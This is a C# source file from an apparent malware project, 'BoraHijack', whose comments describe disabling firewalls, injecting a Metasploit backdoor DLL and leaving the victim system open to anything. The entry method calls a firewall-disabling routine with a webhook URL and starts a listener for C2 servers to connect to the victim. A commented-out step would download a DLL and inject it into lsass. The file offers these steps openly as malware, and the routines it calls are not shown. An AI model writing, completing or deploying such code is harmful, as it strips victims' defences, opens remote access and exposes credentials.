using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BoraHijack.Lambda_Inject
{
    public class Program2
    {
        /*
        λλλλλλλλλλλλλλλλλλλλλ
        λλλ LAMBDA-INJECT λλλ
        λλλλλλλλλλλλλλλλλλλλλ


        dedicated to firewall disabling and network stuff because ive had enough of
        creating so much cs files and i want to be organized. Lambda inject will have injecting capbities like using
        a metasploit backdoor dll and lambda will disable firewalls and only listen on a specified port basically leaving 
        the system vulnerable to ANYTHING
         */

        public static void Main7(string webhookUrl)
        {
            //string dllDownloadUrl = ""; 
            //string targetProcessName = "lsass";

            // injection disabled for hosting file problems

            Firewall.Fwdisable(webhookUrl);
            //await Inject.DownInjectDll(dllDownloadUrl, targetProcessName, webhookUrl);
            IListenerActivate Lambda = new Lambda();

            // these are deactivated as default but you can activate one of them and go into their code which
            // is in Lambda.cs
            Lambda.StartListen();   // listen for c2 servers connecting to victim (modifies firewall)     
        }
    }
}
